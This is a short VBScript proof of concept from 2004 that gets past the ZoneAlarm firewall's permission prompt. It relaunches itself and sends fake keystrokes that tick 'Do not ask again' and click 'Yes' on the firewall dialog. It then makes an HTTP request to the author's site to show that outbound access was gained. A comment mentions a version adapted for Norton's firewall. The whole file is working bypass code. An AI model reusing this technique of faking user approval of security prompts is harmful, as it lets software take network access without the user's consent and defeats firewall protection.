'***********************************************************
'// By Ferruh Mavituna 
'// ferruh{@}mavituna.com, http://ferruh.mavituna.com
'***********************************************************
'// Date : 4/25/2004
'// Simple POC for Skipping Zone Alarm Firewall with sendKeys and multithreading
'// Related Advisory : NOT PUBLISHED YET
'***********************************************************
Option Explicit

Dim argLen, shell, sendKeyMod, i
Const DELAY = 10
Const TIMES = 15

'SendKey
sendkeyMod = False
argLen = WScript.Arguments.Length
If argLen>0 Then sendkeyMod = True 

Set shell = WScript.CreateObject("WScript.Shell")

If sendKeyMod Then
	While i<TIMES
		i=i+1
		WScript.Sleep DELAY
		shell.sendKeys "%A" 'Remember, Do not ask again !
		shell.sendKeys "%O" 'Click Yes
	Wend
	'Customized for norton fw by Oezguer Mavituna
	'Exit
	'Wscript.Echo "Exit !"
	Wscript.Quit 1
End If

'Wscript.Echo WScript.ScriptFullName
Call shell.Run("skipZA.vbs /send")

'Connect
Wscript.Echo connect("http://ferruh.mavituna.com") & "Mission Accomplished..."

Set shell = Nothing
Wscript.Quit 1


Function connect(ByVal URL)
	Dim web
	Set web = CreateObject("Microsoft.XmlHttp")
	web.open "HEAD", URL, FALSE
	web.send ""
	connect = web.getAllResponseHeaders
	Set web = Nothing
End Function